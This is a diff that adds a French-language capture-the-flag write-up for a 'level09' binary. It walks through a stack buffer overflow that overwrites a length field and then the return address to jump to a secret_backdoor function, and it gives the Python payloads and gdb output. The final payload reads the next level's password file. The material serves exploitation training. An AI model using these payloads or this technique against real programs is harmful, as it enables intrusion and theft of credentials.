@@ -1,0 +1,68 @@
+- Apres analyse du code asm, on remarque une structure conteant
+2 tableau et 1 int
+- Dans set_username, il est possible de réécrire l'int qui va
+servir a strncpy dans set_msg
+- On va modifier la stack pour set rip a la fonction
+secret_backdoor qui va nous lancer un system d'un cat
+
+1) On recherche la taille du payload pour pouvoir changer l'adresse
+de rip au moment du ret de handle_msg
+
+touch /tmp/test10
+chmod 777 /tmp/test10
+nano /tmp/test10
+
+python -c 'print "A" * 39 + "\x05\xff" + "B" * 200 + "C" * 50 + "D" * 28 + "E" * 8 + "F" * 8'
+
+gdb ./level09
+r < <(/tmp/test10)
+
+Starting program: /home/users/level09/level09 < <(/tmp/test10)
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+         Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+
+x/16xg $rsp
+
+0x7fffffffe5c8: 0x4646464646464646      0x000000000000000a
+0x7fffffffe5d8: 0x0000000000000000      0x0000000000000000
+0x7fffffffe5e8: 0x0000000000000000      0x0000000000000000
+
+
+2) On recherche l'adresse de secret_backdoor dans gdb
+
+p secret_backdoor
+
+$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+
+3) On remplace "FFFFFFFF" du playload par l'adresse de secret_backdoor
+
+touch /tmp/test11
+chmod 777 /tmp/test11
+nano /tmp/test11
+
+python -c 'print "A" * 39 + "\x05\xff" + "B" * 200 + "C" * 50 + "D" * 28 + "F" * 8 + "\x8c\x48\x55\x55\x55\x55" + "\x00"'
+
+gdb ./level09
+break secret_backdoor
+r < <(/tmp/test11)
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n)
+Starting program: /home/users/level09/level09 < <(/tmp/test11)
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554890 in secret_backdoor ()
+
+4) On setup un 2eme payload pour pouvoir avoir la cmd souhaitée
+alors du fgets de secret_backdoor
+
+touch /tmp/test11
+chmod 777 /tmp/test11
+nano /tmp/test11
+
+python -c 'print "A" * 39 + "\x05\xff" + "B" * 200 + "C" * 50 + "D" * 28 + "F" * 8 + "\x8c\x48\x55\x55\x55\x55" + "\x00" + "A" * (800 + 16) + "cat /home/users/end/.pass"'
+
+/home/users/level09/level09 < <(/tmp/test11)
